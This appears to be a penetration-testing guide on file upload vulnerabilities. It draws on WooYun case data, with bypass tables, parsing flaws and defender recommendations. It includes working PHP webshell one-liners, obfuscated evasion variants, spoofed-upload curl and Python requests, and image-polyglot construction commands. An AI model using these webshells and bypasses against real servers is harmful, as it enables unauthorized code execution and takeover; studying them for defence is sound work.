# File Upload Vulnerability Deep Analysis

> Distilled from 2,711 file upload vulnerability cases in the WooYun vulnerability database, with in-depth analysis of the top 50 high-quality cases

---

## 1. Core Attack Model

```
+-------------------------------------------------------------------------+
|                     File Upload Vulnerability Attack Chain               |
+-------------------------------------------------------------------------+
| Upload Point Discovery -> Detection Bypass -> Path Retrieval ->         |
| Parsing Exploitation -> Webshell Execution -> Post-Exploitation         |
+-------------------------------------------------------------------------+
```

### Attack Success Rate Core Formula

```
Success Rate = P(Bypass Detection) x P(Obtain Path) x P(Parse & Execute)
```

**Key Insight**: Most defenses focus solely on "bypass detection," neglecting path leakage and parsing configuration issues.

---

## 2. Upload Point Identification Matrix

| Upload Point Type | Frequency | Risk Level | Typical Path | Exploitation Difficulty |
|------------------|-----------|------------|-------------|----------------------|
| **Rich Text Editors** | 42% | Critical | `/fckeditor/`, `/ewebeditor/`, `/ueditor/` | Low |
| **Avatar Upload** | 18% | High | `/upload/avatar/`, `/member/uploadfile/` | Medium |
| **Attachment/Document Upload** | 15% | High | `/uploads/`, `/attachment/` | Medium |
| **Admin Panel Upload** | 12% | Critical | `/admin/upload/`, `/system/upload/` | Low |
| **Business Function Upload** | 8% | Medium | `/apply/`, `/submit/` | High |
| **Import Functions** | 5% | High | `/import/`, `/excelUpload/` | Medium |

### 2.1 Rich Text Editor Vulnerability Distribution

```
+------------------------------------------------------------+
|        Editor Vulnerability Share (Based on 50 Cases)      |
+------------------------------------------------------------+
|  FCKeditor    ========================  48%                |
|  eWebEditor   ==============  28%                          |
|  UEditor      ======  12%                                  |
|  KindEditor   ====  8%                                     |
|  Other        ==  4%                                       |
+------------------------------------------------------------+
```

### 2.2 High-Risk Editor Path Quick Reference

| Editor | Test Path | Upload Endpoint |
|--------|-----------|----------------|
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/connectors/test.html` | `/connectors/jsp/connector` |
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/browser.html` | `?Connector=connectors/jsp/connector` |
| eWebEditor | `/ewebeditor/admin/default.jsp` | `/uploadfile/` |
| UEditor | `/ueditor/controller.jsp?action=config` | `/ueditor/controller.jsp` |

---

## 3. Detection Bypass Methodology

### 3.1 Detection Types and Bypass Strategy Matrix

| Detection Type | Detection Location | Bypass Method | Success Rate | Case ID |
|---------------|-------------------|--------------|-------------|---------|
| **JavaScript Validation** | Client-side | Disable JS / Burp interception | 95% | WooYun-2014-068939 |
| **Extension Blocklist** | Server-side | Case variation / double-write / special extensions | 70% | WooYun-2015-0108457 |
| **Extension Allowlist** | Server-side | %00 truncation / parsing vulnerabilities | 40% | WooYun-2016-0167456 |
| **Content-Type** | HTTP Header | Modify to image/jpeg | 85% | WooYun-2016-0212792 |
| **File Header Detection** | File Content | Prepend GIF89a header | 75% | - |
| **Content Detection** | File Content | Image-based webshell / encoding bypass | 60% | - |

### 3.2 Extension Bypass Details

#### 3.2.1 Blocklist Bypass Techniques

```
+-------------------------------------------------------------------------+
|                    Extension Bypass Quick Reference                      |
+-------------------------------------------------------------------------+
| Technique         | PHP Environment        | ASP/ASPX Env     | JSP Env |
+-------------------------------------------------------------------------+
| Case Variation    | .Php .pHp .PHP         | .Asp .aSp         | .Jsp .jSp  |
| Double-Write      | .pphphp                | .asaspp           | .jsjspp    |
| Special Extension | .php3 .php5 .phtml     | .asa .cer .cdx    | .jspx .jspa|
| Space/Dot Bypass  | .php .                 | .asp.             | .jsp.      |
| ::$DATA Stream    | N/A                    | .asp::$DATA       | N/A        |
| %00 Truncation    | .php%00.jpg            | .asp%00.jpg       | .jsp%00.jpg|
| Semicolon (IIS)   | N/A                    | .asp;.jpg         | N/A        |
+-------------------------------------------------------------------------+
```

#### 3.2.2 Real-World Bypass Cases

**Case 1: An OA System Null-Byte Truncation Bypass** (WooYun-2014-064031)
```
Original file: shell.jsp
Bypass method: shell.jsp%00.jpg (truncation after URL decoding)
Upload endpoint: /defaultroot/dragpage/upload.jsp
```

**Case 2: HTTP Response Modification Bypass** (WooYun-2015-0108457)
```
Technique: Modify the server-returned allowed types list
Steps:
1. Intercept server Response
2. Modify allowedTypes to include jsp
3. Upload jsp file normally
```

### 3.3 Content-Type Bypass

| Original Type | Modified To | Applicable Scenario |
|--------------|------------|-------------------|
| `application/octet-stream` | `image/jpeg` | General |
| `application/x-php` | `image/gif` | PHP environments |
| `text/plain` | `image/png` | Text-based scripts |

### 3.4 File Content Bypass

```
Image-based webshell creation methods:
GIF89a
(malicious code content)

Or using the copy command to merge:
copy /b image.gif+shell.php shell.gif
```

---

## 4. Parsing Vulnerability Exploitation

### 4.1 Parsing Vulnerability Overview

```
+-------------------------------------------------------------------------+
|                    Web Server Parsing Vulnerabilities                    |
+-------------------------------------------------------------------------+
|                                                                         |
|  IIS 5.x/6.0                                                          |
|  |-- Directory parsing: /shell.asp/1.jpg  -> Parsed as ASP            |
|  |-- File parsing: shell.asp;.jpg    -> Parsed as ASP                 |
|  |-- Malformed parsing: shell.asp.jpg -> May be parsed as ASP         |
|                                                                         |
|  Apache                                                                |
|  |-- Multi-suffix parsing: shell.php.xxx -> Parses right-to-left,     |
|  |   executes on recognizable suffix                                   |
|  |-- .htaccess: AddType application/x-httpd-php .jpg                  |
|  |-- Newline parsing: shell.php%0a -> CVE-2017-15715                  |
|                                                                         |
|  Nginx                                                                 |
|  |-- Malformed parsing: /1.jpg/shell.php -> Parsed as PHP             |
|  |   (cgi.fix_pathinfo=1)                                             |
|  |-- Null byte: shell.jpg%00.php -> Older version vulnerability       |
|  |-- CVE-2013-4547: shell.jpg \0.php -> Requires specific version     |
|                                                                         |
|  Tomcat                                                                |
|  |-- PUT method: PUT /shell.jsp/ -> CVE-2017-12615                    |
|                                                                         |
+-------------------------------------------------------------------------+
```

### 4.2 IIS 6.0 Parsing Vulnerability in Practice

**Case: FCKeditor + IIS6 Parsing** (WooYun-2015-0138435)

```
Uploaded file: ali.asp;ali.jpg
Actual parsing: ali.asp (content after semicolon is ignored)
Shell path: /Fckeditor/UserFiles/File/ali.asp;ali(2).jpg

Key point: Uploading consecutively twice may succeed
Reason: First attempt may fail; second attempt with renamed file changes semicolon position
```

### 4.3 Apache Parsing Vulnerability in Practice

**Case: Multi-Suffix Parsing**
```
Uploaded file: shell.php.xxx
Apache config: Continues parsing left when .xxx suffix is unrecognized
Result: Executed as PHP

Defense bypass: When .php is blocked
Try: .php3, .php5, .phtml, .phar
```

### 4.4 Nginx Parsing Vulnerability in Practice

**Case: PHP-CGI Parsing Vulnerability** (WooYun-2015-0158311)
```
Normal upload: test.jpg (containing PHP code)
Access path: /upload/test.jpg/.php
Or: /upload/test.jpg/shell.php

Prerequisites:
- cgi.fix_pathinfo = 1 (PHP configuration)
- Nginx lacks security restrictions
```

---

## 5. Webshell Techniques

### 5.1 One-Liner Webshell Variations

| Language | Basic Form | Variation Technique |
|----------|-----------|-------------------|
| **PHP** | Dynamic code execution | Variable concatenation / callback functions |
| **ASP** | Request object invocation | Unicode encoding |
| **ASPX** | Page Language method | Encryption obfuscation |
| **JSP** | Runtime.getRuntime | Using JSPX format |

### 5.2 Evasion Techniques

```
PHP variable function:
$a = 'as'.'sert';
$a($_POST['x']);

PHP callback function:
array_map('assert', array($_POST['x']));

PHP dynamic invocation:
$f = create_function('', $_POST['x']);
$f();
```

### 5.3 JSPX WAF Bypass

**Case: FCKeditor JSPX Upload** (WooYun-2015-0149146)

JSPX is an XML format variant of JSP with the following characteristics:
- WAFs typically inspect `.jsp` but ignore `.jspx`
- Tomcat supports JSPX parsing by default
- Can bind namespaces to execute arbitrary code

---

## 6. Common Vulnerable CMS/Frameworks

### 6.1 High-Risk Target Statistics

```
+------------------------------------------------------------+
|       Vulnerable CMS/Framework Distribution (50 Cases)     |
+------------------------------------------------------------+
|  OA Systems (enterprise)      ================  32%        |
|  Government Systems           ==========  20%              |
|  FCKeditor-Integrated Sites   ========  16%                |
|  Education Systems            ======  12%                  |
|  PHP CMS (Jeecms/Finecms)    ====  8%                     |
|  Enterprise Portals           ====  8%                     |
|  Other                        ==  4%                       |
+------------------------------------------------------------+
```

### 6.2 High-Risk CMS Vulnerability Quick Reference

| CMS/System | Vulnerability Type | Vulnerability Path | Exploitation Conditions |
|-----------|-------------------|-------------------|----------------------|
| **An enterprise OA system** | Arbitrary file upload | `/defaultroot/dragpage/upload.jsp` | Null-byte truncation bypass |
| **An enterprise collaboration platform** | Arbitrary file upload | `/oaerp/ui/sync/excelUpload.jsp` | Bypass JS restriction |
| **An enterprise ERP system** | Arbitrary file upload | `/kdgs/core/upload/upload.jsp` | Registered user access |
| **Jeecms** | Arbitrary file upload | Admin template feature | Requires admin access |
| **Finecms** | Race condition upload | `/member/controllers/Account.php` | Registered user access |
| **PHPEMS** | Arbitrary file upload | `/app/document/api.php` | No extension check |
| **EnableQ** | Arbitrary file upload | Multiple upload endpoints | No login required |

### 6.3 Common Vulnerability Patterns

**Pattern 1: Admin Functions Without Authentication**
```
Issue: Upload functionality does not verify login status
Case: WooYun-2015-0123700 (a university career information system)
Path: /Adminiscentertrator/AdmLinkInsert.asp
Exploitation: Relies only on JavaScript redirect; disabling JS grants access
```

**Pattern 2: Unrestricted Import Functionality**
```
Issue: Excel/file import function allows arbitrary file uploads
Case: WooYun-2014-074398 (an enterprise collaboration platform)
Path: /oaerp/ui/sync/excelUpload.jsp
Exploitation: Bypass JS restriction, brute-force filenames
```

**Pattern 3: Race Condition Vulnerability**
```
Issue: Time gap between upload and deletion
Case: WooYun-2014-063369 (Finecms)
Exploitation: Multi-threaded upload + access, execute before deletion
Technique: Malicious file generates a new file that is not subject to deletion
```

---

## 7. Upload Path Retrieval Techniques

### 7.1 Path Leakage Methods

| Method | Description | Case |
|--------|------------|------|
| **Direct Response Return** | Full path returned after successful upload | Most cases |
| **Preview Function** | View uploaded files to obtain path | WooYun-2015-0108457 |
| **Directory Traversal** | FCKeditor connector directory listing | WooYun-2015-0152437 |
| **Path Rule Guessing** | Timestamp + random number naming convention | WooYun-2014-074398 |
| **Error Messages** | Error pages leak paths | - |
| **Source Code Audit** | Analyze code to determine naming rules | - |

### 7.2 Naming Rule Brute Force

**Case: Timestamp Naming Brute Force** (WooYun-2014-074398)
```
Naming rule: Upload time (to the second) + original filename
Example: 20140829221136jsp.jsp

Brute-force method:
1. Record upload time
2. Brute-force second offset (+/-60 seconds)
3. Attempt access to obtain shell
```

---

## 8. Defense Bypass Thinking Framework

### 8.1 Systematic Analysis

```
+-------------------------------------------------------------------------+
|                Defense Mechanism Reverse Analysis Framework              |
+-------------------------------------------------------------------------+
|                                                                         |
|  Layer 1: Identify Defense Points                                      |
|  |-- Client-side detection? (JS/Flash restrictions)                    |
|  |-- Server-side detection? (Extension/Content-Type/Content)           |
|  |-- WAF detection? (Signature matching/behavioral analysis)           |
|                                                                         |
|  Layer 2: Analyze Detection Logic                                      |
|  |-- Blocklist or allowlist?                                           |
|  |-- What is the detection order?                                      |
|  |-- Are there logic flaws?                                            |
|                                                                         |
|  Layer 3: Construct Bypass Vectors                                     |
|  |-- Single-point bypass: Targeting specific detection                 |
|  |-- Combined bypass: Multiple techniques in concert                   |
|  |-- Logic bypass: Exploiting design defects                           |
|                                                                         |
|  Layer 4: Validate and Iterate                                         |
|  |-- Test bypass effectiveness                                         |
|  |-- Analyze failure reasons                                           |
|  |-- Adjust bypass strategy                                            |
|                                                                         |
+-------------------------------------------------------------------------+
```

### 8.2 Decision Tree

```
                        +-------------------+
                        | Upload Feature    |
                        | Discovered        |
                        +---------+---------+
                                  |
                     +------------v------------+
                     | Client-side restriction? |
                     +------------+------------+
                           Yes    |    No
                     +------------+------------+
                     |                         |
             +-------v-------+         +-------v-------+
             | Disable JS /  |         | Direct upload |
             | intercept     |         | test          |
             +-------+-------+         +-------+-------+
                     |                         |
                     +------------+------------+
                                  |
                     +------------v------------+
                     | Server-side error?       |
                     +------------+------------+
                                  |
         +------------------------+------------------------+
         |                        |                        |
  +------v-------+        +------v-------+        +-------v------+
  | Extension    |        | Content-Type |        | File Content |
  | error        |        | error        |        | error        |
  +------+-------+        +------+-------+        +-------+------+
         |                        |                        |
  +------v-------+        +------v-------+        +-------v------+
  | Try extension|        | Modify       |        | Add file     |
  | bypass: case |        | Content-Type |        | header /     |
  | /truncation  |        | header       |        | image-based  |
  +--------------+        +--------------+        | webshell     |
                                                  +--------------+
```

---

## 9. Key Insights

### 9.1 Attacker Perspective Meta-Analysis

1. **Editors are the biggest attack surface**: 42% of cases involve rich text editors, and most websites run outdated editor versions

2. **Client-side validation = no validation**: 100% of pure client-side validation can be bypassed; this is the most basic yet most common mistake

3. **Path leakage is critically underestimated**: Even when upload succeeds, exploitation is difficult without a returned path; yet most systems leak paths

4. **Server configuration is the last line of defense**: IIS 6.0 parsing vulnerabilities still exist in large numbers of government and enterprise systems

5. **Race conditions are an advanced bypass**: When all validation checks are correct, exploiting the deletion time window can still achieve shell access

### 9.2 Blind Spots Defenders Should Address

| Blind Spot | Problem Description | Recommendation |
|-----------|-------------------|----------------|
| **Editor Updates** | Using outdated editor versions | Regularly update or remove test files |
| **Directory Permissions** | Upload directories can execute scripts | Disable execution permissions on upload directories |
| **Path Disclosure** | Returning complete upload paths | Use randomized paths or CDN |
| **Parsing Configuration** | Server has parsing vulnerabilities | Upgrade servers, disable dangerous parsing |
| **Race Conditions** | Time gap between upload-check-delete | Check before storing, or use atomic operations |

---

## 10. Practical Checklist

### 10.1 Penetration Testing Checklist

- [ ] Scan for common editor paths
- [ ] Test various upload points (avatar, attachment, import)
- [ ] Disable JavaScript to test client-side validation
- [ ] Test extension bypass (case variation, double-write, truncation)
- [ ] Test Content-Type modification
- [ ] Test file header bypass
- [ ] Identify server type, test corresponding parsing vulnerabilities
- [ ] Analyze file naming conventions
- [ ] Test directory traversal to obtain paths
- [ ] Test race condition upload

### 10.2 Quick Vulnerability Verification

```
FCKeditor Quick Check:
Visit /FCKeditor/editor/filemanager/browser/default/connectors/test.html

Directory Traversal Test (FCKeditor):
Visit /FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/../

IIS Parsing Vulnerability Test:
Upload shell.asp;.jpg and access it
```

---

## Appendix: Case Index

| Case ID | Key Technique | Target Type |
|---------|--------------|------------|
| WooYun-2015-0108457 | HTTP Response Modification | A transportation system |
| WooYun-2015-0135258 | FCKeditor | A public transit system |
| WooYun-2016-0167456 | %00 Truncation | A financial system |
| WooYun-2014-064031 | Null-byte truncation bypass | An enterprise OA system |
| WooYun-2015-090186 | eWebEditor | A government procurement system |
| WooYun-2014-063369 | Race Condition | Finecms |
| WooYun-2015-0126541 | Architecture Analysis | An enterprise OA system |
| WooYun-2015-0149146 | JSPX Bypass | An insurance system |
| WooYun-2015-0158311 | Parsing Vulnerability | A major web portal |
| WooYun-2016-0212792 | Extension Bypass | A telecom provider |

---

## 11. Vulnerability Meta-Analysis Methodology

### 11.1 Validation Defect Analysis Framework

```
+-------------------------------------------------------------------------+
|             File Upload Validation Defect Meta-Cognitive Model           |
+-------------------------------------------------------------------------+
|                                                                         |
|  [Core Question] Why are file upload vulnerabilities so prevalent       |
|  and difficult to defend against?                                       |
|                                                                         |
|  [First Principles]                                                    |
|  |-- File upload essence = Receive external data + Store on server     |
|  |   + Potential execution                                             |
|  |-- Risk source = Trust boundary is broken                            |
|  |-- Defense dilemma = Functional need (allow upload) vs Security need |
|  |   (restrict execution) contradiction                                |
|                                                                         |
|  [Validation Defect Taxonomy]                                          |
|  |-- Location error: Client-side vs server-side validation             |
|  |-- Method error: Blocklist vs allowlist                              |
|  |-- Logic error: Validation order vs processing order                 |
|  |-- Scope error: Partial validation vs complete validation            |
|  |-- Context error: File system vs web server parsing                  |
|                                                                         |
|  [Deep Insights]                                                       |
|  1. Validation completeness paradox: More complex validation creates   |
|     more bypass vectors                                                |
|  2. Context mismatch: Code-level security != runtime security          |
|  3. Multi-layer defense fragility: Each layer assumes others are doing |
|     their job                                                          |
|  4. Time window vulnerability: Time gap between validation and use     |
|                                                                         |
+-------------------------------------------------------------------------+
```

### 11.2 Validation Defect Type Analysis

#### Case: WooYun-2015-0127845 Meta-Analysis

**Vulnerability Surface**:
```json
{
  "bug_id": "wooyun-2015-0127845",
  "title": "A system file upload leading to arbitrary code execution",
  "vuln_type": "Vulnerability Type: File upload leading to arbitrary code execution",
  "level": "Severity: High",
  "detail": "Upload function did not properly validate file type, uploaded .php file was executed",
  "poc": "Upload shell.php with content: <?php system($_POST['cmd']); ?>"
}
```

**Deep Analysis**:

| Dimension | Surface Issue | Underlying Defect | Systemic Impact |
|----------|--------------|-------------------|-----------------|
| **Validation Location** | Weak server-side validation | Possibly missing client + server dual validation | Expanded attack surface |
| **Validation Method** | Type not properly validated | Possibly using blocklist instead of allowlist | Many bypass vectors |
| **Validation Scope** | Only extension validated | Content-Type, file header, content not validated | Partial validation bypassable |
| **Execution Context** | Upload directory is executable | Web server configuration allows parsing in upload directory | Single defense layer |
| **Access Control** | Possibly no permission check | Upload function access not restricted | Easy lateral movement |

**Root Cause Analysis**:
> The typical nature of this case demonstrates the universal problem of "incomplete defense." Developers may believe "having some validation is enough" but overlook a fundamental truth: **validation must be multi-layered, complete, and non-bypassable**. Single-point validation is like a door with only one lock -- an attacker only needs to find one bypass method.

---

## 12. Bypass Techniques Panorama (Enhanced)

### 12.1 Bypass Technique Classification System

```
+-------------------------------------------------------------------------+
|            Complete File Upload Bypass Technique Classification          |
+-------------------------------------------------------------------------+
|                                                                         |
|  [Level 1: Client-Side Bypass]                                         |
|  |-- Disable JavaScript                                                |
|  |-- Modify HTML form restrictions                                     |
|  |-- Use Burp Suite to intercept and modify                           |
|  |-- Remove attributes via browser developer tools                     |
|  |-- Curl/Python direct POST request                                   |
|                                                                         |
|  [Level 2: Server-Side Extension Bypass]                               |
|  |-- Case variation: .Php .pHp .PHP5                                  |
|  |-- Double-write: .pphphp .asaspp                                    |
|  |-- Special suffix: .php3 .php5 .phtml .phps                        |
|  |-- Null char/dot: .php. .php%00.jpg                                 |
|  |-- Stream wrapper (Windows): .asp::$DATA                            |
|  |-- Semicolon truncation (IIS): .asp;.jpg                            |
|  |-- Newline (Apache): .php\x0a (CVE-2017-15715)                     |
|  |-- Double extension: shell.php.jpg                                   |
|                                                                         |
|  [Level 3: MIME Type Spoofing]                                         |
|  |-- Basic disguise: image/jpeg, image/gif, image/png                 |
|  |-- Other types: application/octet-stream                            |
|  |-- Multipart type: multipart/form-data boundary manipulation        |
|  |-- Empty/no type: Omit Content-Type                                  |
|                                                                         |
|  [Level 4: File Content Bypass]                                        |
|  |-- File header spoofing: GIF89a, PNG header, JPEG header            |
|  |-- Image-based webshell: copy /b image.jpg+shell.php                |
|  |-- Injection obfuscation: <?php ?> hidden in image EXIF             |
|  |-- Encoding bypass: base64, rot13, XOR encryption                   |
|  |-- Race condition: Access before deletion after upload               |
|  |-- Structure manipulation: Modify file structure while preserving    |
|  |   executability                                                     |
|                                                                         |
|  [Level 5: Server Configuration Exploitation]                          |
|  |-- IIS 6.0 parsing vulnerability: /shell.asp/1.jpg                  |
|  |-- Apache multi-suffix: shell.php.xxx                               |
|  |-- Nginx CGI vulnerability: /image.jpg/shell.php                    |
|  |-- .htaccess manipulation: Rewrite parsing rules                    |
|  |-- User config files: .user.ini, .htaccess                          |
|  |-- Server version vulnerabilities: Specific version CVEs            |
|                                                                         |
|  [Level 6: Logic Vulnerability Exploitation]                           |
|  |-- Rename vulnerability: Upload legitimate file, rename to          |
|  |   malicious                                                         |
|  |-- Path Traversal: ../../shell.php                                  |
|  |-- Race condition: Upload-check-delete time gap                     |
|  |-- Second-order injection: Upload first, exploit via other feature  |
|  |-- Privilege escalation: Low-privilege upload + high-privilege exec  |
|  |-- Stored XSS: Upload HTML file to exploit XSS                     |
|                                                                         |
+-------------------------------------------------------------------------+
```

### 12.2 Client-Side JavaScript Validation Bypass Details

#### 12.2.1 Bypass Technique Matrix

| Bypass Method | Technical Principle | Applicable Scenario | Success Rate | Detection Difficulty |
|--------------|-------------------|-------------------|-------------|---------------------|
| **Disable JS** | Browser setting to not execute JS | All client-side validation | 100% | None |
| **Intercept & Modify** | Burp intercepts and modifies HTTP packets | All client-side validation | 100% | Medium |
| **Modify HTML** | Remove accept attribute, modify onsubmit | Form restrictions | 95% | Low |
| **Curl Request** | Directly construct POST bypassing browser | All scenarios | 100% | Medium |
| **API Call** | Python/Go direct HTTP requests | Automated testing | 100% | High |

#### 12.2.2 Real-World Bypass Examples

**Scenario 1: Simple JavaScript Extension Check**
```javascript
// Original code (client-side)
function checkFile() {
    var file = document.getElementById('file').value;
    if (!file.match(/\.(jpg|png|gif)$/i)) {
        alert('Only image uploads allowed');
        return false;
    }
}

// Bypass Method 1: Disable JavaScript
// Browser settings -> Disable JS -> Upload directly

// Bypass Method 2: Burp Interception
// 1. Select shell.php and click upload
// 2. Burp intercepts POST request
// 3. Modify filename to shell.php
// 4. Forward the request
```

**Scenario 2: HTML Attribute Restrictions**
```html
<!-- Original HTML -->
<input type="file" name="upload" accept="image/*" onchange="validate()">

<!-- Bypass Methods -->
<!-- 1. Developer tools: Remove accept attribute -->
<!-- 2. Modify onchange function to empty -->
<!-- 3. Upload PHP file directly -->
```

**Scenario 3: Multiple Client-Side Validations**
```javascript
// Bypass strategy: Use Curl to POST directly
curl -X POST http://target/upload.php \
  -F "file=@shell.php" \
  -F "submit=upload" \
  -H "Content-Type: multipart/form-data"

// Or using Python
import requests
files = {'file': ('shell.jpg', open('shell.php', 'rb'), 'image/jpeg')}
r = requests.post('http://target/upload.php', files=files)
```

#### 12.2.3 Root Cause Analysis

> **The Security Paradox of Client-Side Validation**: The purpose of client-side validation is not security, but user experience. True security must be implemented server-side. Any security measure that relies on client-side validation is like "putting the key under the doormat" -- it appears protective on the surface, but an attacker can bypass it directly.
>
> **Detection Indicator**: If you discover a website only has validation logic on the client-side with the server accepting directly, this indicates the developer confused "user experience" and "security boundary" concepts. This mistake is extremely common among junior developers.

### 12.3 MIME Type Validation Bypass Details

#### 12.3.1 Bypass Technique Matrix

| Detection Method | Bypass Technique | Technical Details | Success Rate |
|-----------------|-----------------|-------------------|-------------|
| **Simple MIME Check** | Modify Content-Type header | image/jpeg, image/gif, etc. | 95% |
| **Allowlist MIME** | Disguise as allowed type | Use image MIME types | 90% |
| **MIME + Extension** | Modify both simultaneously | Consistent spoofing | 85% |
| **Complete Check** | Requires combining other bypasses | File header + content bypass | 60% |

#### 12.3.2 Common MIME Types Quick Reference

```python
# Image types (most commonly used)
image/jpeg    # JPEG image
image/gif     # GIF image
image/png     # PNG image
image/bmp     # BMP image
image/webp    # WebP image

# Document types
application/pdf         # PDF document
application/msword      # Word document
application/vnd.ms-excel  # Excel document

# Generic types
application/octet-stream  # Binary stream (many systems accept)
multipart/form-data       # Form upload (standard)

# Other types
text/plain               # Plain text
text/html                # HTML
application/json         # JSON data
```

#### 12.3.3 Real-World Bypass Examples

**Scenario 1: PHP Backend Checking $_FILES Type**
```php
// Server-side validation code (vulnerable)
$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($_FILES['file']['type'], $allowed_types)) {
    die("Only image uploads allowed");
}

// Bypass method: Modify HTTP header
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    <-- Key: Modify to image type

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**Scenario 2: Python/Go Spoofed Upload**
```python
import requests

# Method 1: Directly specify Content-Type
files = {
    'file': ('shell.jpg',           # Filename (disguised)
             open('shell.php', 'rb'),  # Actual content
             'image/jpeg')           # MIME type (spoofed)
}
r = requests.post('http://target/upload.php', files=files)

# Method 2: Full request control
import requests
from io import BytesIO

# Construct multipart/form-data
payload = BytesIO()
boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'

# Construct request body...
headers = {
    'Content-Type': f'multipart/form-data; boundary={boundary}'
}
```

**Scenario 3: MIME + Extension Dual Spoofing**
```bash
# Using curl
curl -X POST http://target/upload.php \
  -F "file=@shell.php;filename=shell.jpg" \
  -H "Content-Type: image/jpeg" \
  -H "X-File-Type: image/jpeg"

# Or using Burp:
# 1. Upload shell.php
# 2. Intercept request
# 3. Modify filename in Content-Disposition to shell.jpg
# 4. Modify Content-Type to image/jpeg
```

#### 12.3.4 Root Cause Analysis

> **The Trust Problem of MIME Validation**: MIME types are part of the HTTP protocol, provided by the client. Server-side validation of client-provided data is itself a "trust paradox." It is like asking a thief to confirm their own identity -- an attacker can forge any MIME type.
>
> **The Correct Approach**: MIME types can only serve as supplementary validation. True validation must be based on:
> 1. File extension (server-side rewriting)
> 2. File header (Magic Number)
> 3. File content structure
> 4. File size and dimensions (for images)
>
> Only consistency checks across multiple dimensions can provide relatively reliable security assurance.

### 12.4 File Header Detection Bypass Details

#### 12.4.1 Common File Headers (Magic Numbers) Quick Reference

```
+-------------------------------------------------------------------------+
|                     Common File Magic Number Table                      |
+-------------------------------------------------------------------------+
| File Type  | Magic Number (Hex)        | ASCII       | Offset          |
+-------------------------------------------------------------------------+
| JPEG       | FF D8 FF                  | ...         | 0               |
| PNG        | 89 50 4E 47               | .PNG        | 0               |
| GIF        | 47 49 46 38               | GIF8        | 0               |
| BMP        | 42 4D                     | BM          | 0               |
| TIFF       | 49 49 2A 00               | II*.        | 0               |
| ICO        | 00 00 01 00               | ....        | 0               |
| WebP       | 52 49 46 46               | RIFF        | 0               |
+-------------------------------------------------------------------------+
| PDF        | 25 50 44 46               | %PDF        | 0               |
| ZIP        | 50 4B 03 04               | PK..        | 0               |
| RAR        | 52 61 72 21               | Rar!        | 0               |
| 7Z         | 37 7A BC AF 27 1C         | 7z...'      | 0               |
+-------------------------------------------------------------------------+
| MP3        | 49 44 33                  | ID3         | 0               |
| WAV        | 52 49 46 46               | RIFF        | 0               |
| AVI        | 52 49 46 46               | RIFF        | 0               |
+-------------------------------------------------------------------------+
| ELF        | 7F 45 4C 46               | .ELF        | 0               |
| EXE        | 4D 5A                     | MZ          | 0               |
+-------------------------------------------------------------------------+
```

#### 12.4.2 File Header Spoofing Techniques

**Method 1: Simple File Header Prepending**
```php
// GIF file header
GIF89a<?php system($_POST['cmd']); ?>

// JPEG file header
FF D8 FF<?php system($_POST['cmd']); ?>

// PNG file header
89 50 4E 47<?php system($_POST['cmd']); ?>
```

**Method 2: Image-Based Webshell Creation (Command Line)**
```bash
# Windows
copy /b image.gif+shell.php shell.gif

# Linux/Mac
cat image.gif shell.php > shell.gif

# Using dd command
dd if=image.gif of=shell.gif bs=1 count=6
cat shell.php >> shell.gif

# Using exiftool to inject PHP into EXIF
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

**Method 3: PHP-Generated Image-Based Webshell**
```php
<?php
// Read original image
$image = imagecreatefromjpeg('original.jpg');

// Add comment (hidden PHP code)
// Note: This method requires a file inclusion vulnerability
imagepng($image, 'shell_with_php.jpg');
imagedestroy($image);

// Or inject into image metadata
$exif = array(
    'Comment' => '<?php system($_GET["cmd"]); ?>'
);
```

**Method 4: Binary File Header Construction**
```python
# Python script to construct image-based webshell
def create_fake_gif(php_code):
    gif_header = b'GIF89a'
    return gif_header + php_code.encode()

# Usage example
php_code = "<?php system($_POST['cmd']); ?>"
fake_gif = create_fake_gif(php_code)

with open('shell.gif', 'wb') as f:
    f.write(fake_gif)
```

#### 12.4.3 Real-World Cases Bypassing File Header Detection

**Case 1: Only Checking First N Bytes**
```python
# Server-side code (vulnerable)
def check_file_header(file):
    header = file.read(4)
    if header == b'GIF8':
        return True
    return False

# Bypass: Prepend GIF header to PHP file
# Constructed file: GIF89a + PHP code
payload = b'GIF89a<?php system($_POST["cmd"]); ?>'
```

**Case 2: Checking Complete File Header**
```python
# Stricter detection
def check_image(file):
    header = file.read(6)
    # Check complete GIF file header format
    if header == b'GIF89a' or header == b'GIF87a':
        return True
    return False

# Bypass methods:
# 1. Use a real GIF file
# 2. Append PHP code at the end of the GIF file
# 3. Or exploit a file inclusion vulnerability (LFI/RFI)
```

**Case 3: Image Dimension Detection Bypass**
```php
// Server-side detection (vulnerable)
$info = getimagesize($_FILES['file']['tmp_name']);
if (!$info || $info[0] < 1 || $info[1] < 1) {
    die("Not a valid image");
}

// Bypass: Construct a PHP file containing a complete image structure
// Ensure PHP code does not break the image structure
```

#### 12.4.4 Advanced Bypass: Exploiting Image Parsing Vulnerabilities

**Method 1: Using Polyglot Files**
```bash
# A file that is simultaneously a GIF and a ZIP
# GIF portion: GIF89a
# ZIP portion: PK..
# Can be uploaded as a valid image, but the ZIP portion can be extracted
```

**Method 2: Leveraging EXIF Data**
```bash
# Use exiftool to inject code into EXIF
exiftool -Comment='<?php system($_GET["x"]); ?>' image.jpg

# Use with LFI vulnerability
# /image.php?file=uploads/image.jpg
# If include() processes this file, PHP in EXIF will execute
```

**Method 3: Using Steganography**
```bash
# Use steghide tool to hide PHP inside an image
steghide embed -cf image.jpg -ef shell.php
steghide extract -sf image.jpg

# Note: Requires a file inclusion vulnerability
```

#### 12.4.5 Root Cause Analysis

> **Limitations of File Header Detection**: File header detection is fundamentally "shallow validation." It only checks the beginning of the file, not its entire structure. Like judging a book by its cover, an attacker can easily insert malicious code after a real file header.
>
> **Deeper Considerations**:
> 1. **Integrity problem**: File header match != valid file. Attackers can append code after a real image.
> 2. **Parser differences**: Different image libraries have varying tolerance for file format errors. Some libraries stop parsing on errors, while others continue.
> 3. **Metadata blind spots**: EXIF, IPTC, and other metadata fields are often overlooked but can contain substantial malicious code.
